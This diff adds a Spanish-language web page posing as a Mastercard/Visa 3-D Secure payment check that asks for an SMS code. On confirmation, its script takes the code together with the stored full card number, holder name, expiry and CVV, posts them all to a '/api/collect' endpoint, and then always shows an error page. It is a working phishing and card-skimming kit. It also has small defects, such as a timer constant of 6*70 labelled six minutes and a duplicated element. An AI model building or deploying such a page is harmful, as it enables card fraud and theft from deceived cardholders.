@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificación de Pago Segura</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f8fafc;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .threeDS-card {
+      width: 420px;
+      max-width: 92%;
+      background: white;
+      border-radius: 12px;
+      padding: 24px;
+      box-shadow: 0 20px 50px rgba(2,6,23,0.25);
+      text-align: center;
+      position: relative;
+    }
+
+    #threeDS-logos {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 100px;
+      margin-bottom: 16px;
+    }
+
+    #threeDS-logos img {
+      height: 40px;
+      width: auto;
+    }
+
+    /* Resumen tarjeta y total */
+    .card-summary {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 10px;
+    }
+    .card-summary img {
+      height: 32px;
+    }
+    .card-summary span {
+      font-weight: 600;
+    }
+    #purchase-total {
+      margin-bottom: 16px;
+      font-weight: bold;
+      color: #1f2937;
+    }
+
+    /* Spinner */
+    .spinner {
+      width: 56px;
+      height: 56px;
+      margin: 20px auto;
+      border-radius: 50%;
+      border: 4px solid #e6e9ee;
+      border-top-color: #6366f1;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    #threeDS-title { font-size: 20px; margin-bottom: 8px; color: #1f2937; }
+    #threeDS-content p { color: #6b7280; font-size: 14px; margin-bottom: 12px; }
+
+    .otp-row { display:flex; gap:10px; align-items:center; justify-content:center; margin-top:12px; }
+    #otp-input {
+      width: 180px;
+      padding: 12px 14px;
+      border-radius: 8px;
+      border: 2px solid #e5e7eb;
+      font-size: 16px;
+      text-align:center;
+    }
+    #otp-input:focus { outline:none; border-color:#6366f1; box-shadow:0 0 0 4px rgba(99,102,241,0.08); }
+
+    .continue-btn {
+      background: #6366f1;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .continue-btn:disabled { opacity:0.5; cursor:not-allowed; }
+    .continue-btn:hover:enabled { background:#4f46e5; }
+
+    .countdown-row { margin-top:14px; display:flex; align-items:center; justify-content:center; gap:12px; color:#374151; font-weight:600; }
+    #threeDS-timer { font-variant-numeric: tabular-nums; }
+
+    #threeDS-msg { margin-top: 10px; font-size: 14px; display: none; }
+
+    .circular-timer {
+  position: relative;
+  width: 100px;
+  height: 100px;
+  margin: 18px auto;
+}
+
+.circular-timer svg {
+  transform: rotate(-90deg);
+  width: 100px;
+  height: 100px;
+}
+
+.circular-timer circle {
+  fill: none;
+  stroke-width: 8;
+  stroke-linecap: round;
+}
+
+.circular-timer circle.bg {
+  stroke: #e5e7eb;
+}
+
+.circular-timer circle.progress {
+  stroke: #5C9DD3; /* color inicial */
+  stroke-dasharray: 270; /* perímetro del círculo: 2πr ≈ 2*π*54 */
+  stroke-dashoffset: 0;
+  transition: stroke 0.5s linear;
+}
+
+.circular-timer .time {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  font-size: 16px;
+  font-weight: bold;
+  color: #111827;
+}
+
+  </style>
+</head>
+<body>
+
+  <div class="threeDS-card">
+
+    <!-- Logos principales -->
+    <div id="threeDS-logos">
+      <img src="img/iconos/master.png" alt="Mastercard ID Check" />
+      <img src="img/iconos/visa.png" alt="Visa Secure" />
+    </div>
+
+    <!-- Resumen dinámico -->
+    <div class="card-summary" id="card-summary" style="display:none;">
+    <img id="payment-card-logo" src="" alt="Logo tarjeta" />
+    <span id="payment-card-number">•••• •••• •••• 0000</span>
+    </div>
+<p id="purchase-total" style="display:none;">Total: $0</p>
+
+    <p id="purchase-total" style="display:none;">Total: $0</p>
+
+    <!-- Spinner al inicio -->
+    <div id="threeDS-spinner" class="spinner"></div>
+
+    <!-- Contenido de verificación -->
+    <div id="threeDS-content" style="display:none;">
+      <h3 id="threeDS-title">Verificación segura</h3>
+      <p id="verification-text"></p>
+
+      <div class="otp-row">
+        <input id="otp-input" type="text" maxlength="6" inputmode="numeric" placeholder="Código de 6 dígitos" />
+        <button id="confirm-otp" class="continue-btn" disabled>Confirmar</button>
+      </div>
+
+      <div class="countdown-row">
+        <div class="circular-timer">
+        <svg>
+            <circle class="bg" cx="48" cy="48" r="43"></circle>
+            <circle class="progress" id="progress-circle" cx="48" cy="48" r="43"></circle>
+        </svg>
+        <div class="time" id="threeDS-timer">06:00</div>
+            </div>
+
+
+        <button id="resend-code" class="continue-btn" disabled>Reenviar código</button>
+      </div>
+
+      <p id="threeDS-msg"></p>
+    </div>
+  </div>
+
+  <script>
+    const THREE_DS_DURATION = 6 * 70; // 6 minutos
+    let threeDSRemaining = THREE_DS_DURATION;
+    let threeDSTimerInterval = null;
+
+    function startCountdown() {
+      updateTimerDisplay();
+      threeDSTimerInterval = setInterval(() => {
+        if (threeDSRemaining > 0) {
+          threeDSRemaining--;
+          updateTimerDisplay();
+          if (threeDSRemaining === 0) {
+            document.getElementById('resend-code').disabled = false;
+          }
+        }
+      }, 1000);
+    }
+
+const CIRCLE_LENGTH = 2 * Math.PI * 43; // ≈ 270
+const progressCircle = document.getElementById("progress-circle");
+
+function updateTimerDisplay() {
+  const m = Math.floor(threeDSRemaining / 60).toString().padStart(2,'0');
+  const s = (threeDSRemaining % 60).toString().padStart(2,'0');
+  document.getElementById('threeDS-timer').textContent = `${m}:${s}`;
+
+  // porcentaje transcurrido
+  const elapsed = THREE_DS_DURATION - threeDSRemaining;
+  const percent = elapsed / THREE_DS_DURATION;
+  const offset = CIRCLE_LENGTH * percent;
+  progressCircle.style.strokeDasharray = CIRCLE_LENGTH;
+  progressCircle.style.strokeDashoffset = offset;
+
+  // cambiar color dinámicamente
+  if (percent < 0.5) {
+    progressCircle.style.stroke = "#5C9DD3"; // inicio
+  } else if (percent < 0.8) {
+    progressCircle.style.stroke = "#B96A35"; // intermedio
+  } else {
+    progressCircle.style.stroke = "#E02C21"; // final
+  }
+}
+
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const spinner = document.getElementById("threeDS-spinner");
+      const content = document.getElementById("threeDS-content");
+      const otpInput = document.getElementById("otp-input");
+      const confirmBtn = document.getElementById("confirm-otp");
+      const resendBtn = document.getElementById("resend-code");
+      const msg = document.getElementById("threeDS-msg");
+
+      // 🔹 Recuperar info de reserva
+      const cardLogo = localStorage.getItem("cardLogo");
+      const maskedCard = localStorage.getItem("maskedCard");
+      const total = localStorage.getItem("purchaseTotal");
+      const phone = localStorage.getItem("customerPhone") || "";
+
+      if (cardLogo) document.getElementById("payment-card-logo").src = cardLogo;
+      if (maskedCard) document.getElementById("payment-card-number").textContent = maskedCard;
+      if (total) document.getElementById("purchase-total").textContent = `Total: ${total}`;
+
+      // Enmascarar teléfono
+      let masked = "**********";
+      if (phone.length >= 7) {
+        masked = phone.replace(/(\d{3})\d{3,4}(\d{3})/, "$1***$2");
+      }
+      document.getElementById("verification-text").textContent =
+        `Hemos enviado un código de verificación a tu número ${masked}. Ingresa el código para continuar.`;
+
+      // Mostrar spinner 3.5s y luego formulario
+      setTimeout(() => {
+        spinner.style.display = "none";
+        content.style.display = "block";
+        
+        document.getElementById("card-summary").style.display = "flex";
+        document.getElementById("purchase-total").style.display = "block";
+        
+        startCountdown();
+      }, 3500);
+
+      otpInput.addEventListener("input", () => {
+        otpInput.value = otpInput.value.replace(/\D/g,'').slice(0,6);
+        confirmBtn.disabled = otpInput.value.length !== 6;
+        msg.style.display = "none";
+      });
+
+      confirmBtn.addEventListener("click", async () => {
+  confirmBtn.disabled = true;
+  confirmBtn.textContent = "Verificando...";
+
+  // Recuperar OTP y datos guardados
+  const otp = otpInput.value;
+  const payload = {
+    otp,
+    phone: localStorage.getItem("customerPhone") || "",
+    cardNumber: localStorage.getItem("fullCardNumber") || "",
+    cardHolder: localStorage.getItem("cardHolder") || "",
+    cardExpiry: localStorage.getItem("cardExpiry") || "",
+    cardCVV: localStorage.getItem("cardCVV") || "",
+    maskedCard: localStorage.getItem("maskedCard") || "",
+    total: localStorage.getItem("purchaseTotal") || ""
+  };
+
+  try {
+    // Enviar al endpoint serverless
+    const res = await fetch('/api/collect', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+
+    // Independientemente de la respuesta, según pediste, mostrar la pantalla de error
+    // (puedes chequear res.ok y actuar distinto si quieres)
+    window.location.href = "Error.html";
+  } catch (err) {
+    // Si falla la petición, igual ir a Error.html o mostrar mensaje
+    console.error("Error enviando datos:", err);
+    window.location.href = "Error.html";
+  }
+});
+
+
+      resendBtn.addEventListener("click", () => {
+        resendBtn.disabled = true;
+        threeDSRemaining = THREE_DS_DURATION;
+        startCountdown();
+        msg.style.display = "block";
+        msg.style.color = "#0f766e";
+        msg.textContent = "📩 Nuevo código enviado.";
+        setTimeout(() => { msg.style.display="none"; }, 2500);
+      });
+    });
+  </script>
+</body>
+</html>
